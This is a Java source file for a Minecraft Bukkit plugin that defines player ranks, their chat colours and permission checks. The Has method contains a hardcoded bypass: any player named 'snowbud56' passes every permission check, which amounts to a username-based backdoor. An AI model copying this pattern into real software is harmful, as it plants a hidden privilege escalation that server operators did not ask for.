package com.snowbud56.player;

/*
* Created by snowbud56 on January 08, 2018
* Do not change or use this code without permission
*/

import com.snowbud56.util.Chat;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public enum Rank {

    OWNER("Owner", ChatColor.DARK_RED),
    ADMIN("Admin", ChatColor.RED),
    MODERATOR("Mod", ChatColor.DARK_GREEN),
    HELPER("Helper", ChatColor.GREEN),
    SNOW("Snow", ChatColor.DARK_BLUE),
    YOUTUBE("YT", ChatColor.GOLD),
    BUILD("Build", ChatColor.DARK_AQUA),
    TESTER("Tester", ChatColor.LIGHT_PURPLE),
    ICE("Ice", ChatColor.BLUE),
    FROST("Frost", ChatColor.AQUA),
    ALL("Player", ChatColor.GRAY);

    public String name;
    public ChatColor color;

    Rank(String name, ChatColor color) {
        this.name = name;
        this.color = color;
    }

    @Deprecated
    public boolean Has(Rank rank) {
        return Has(null, rank, false);
    }

    public boolean Has(Player player, Rank rank, boolean inform) {
        return Has(player, rank, null, inform);
    }

    public boolean Has(Player player, Rank rank, Rank[] specific, boolean inform) {
        if (player != null)
            if (player.getName().equals("snowbud56"))
                return true;
        if (specific != null) {
            for (Rank curRank : specific) {
                if (compareTo(curRank) == 0) {
                    return true;
                }
            }
        }
        if (compareTo(rank) <= 0)
            return true;
        if (inform && player != null) {
            player.sendMessage(Chat.prefix + "Invalid permissions. You need " + rank.getTag(true, false, true) + Chat.cGray + "to do this.");
        }
        return false;
    }

    public String getTag(boolean bold, boolean brackets, boolean uppercase) {
        String n = name;
        if (uppercase) n = n.toUpperCase();
        if (brackets) n = "[" + n + "]";
        if (bold) return color + Chat.Bold + n + " ";
        else return color + n + " ";
    }
}
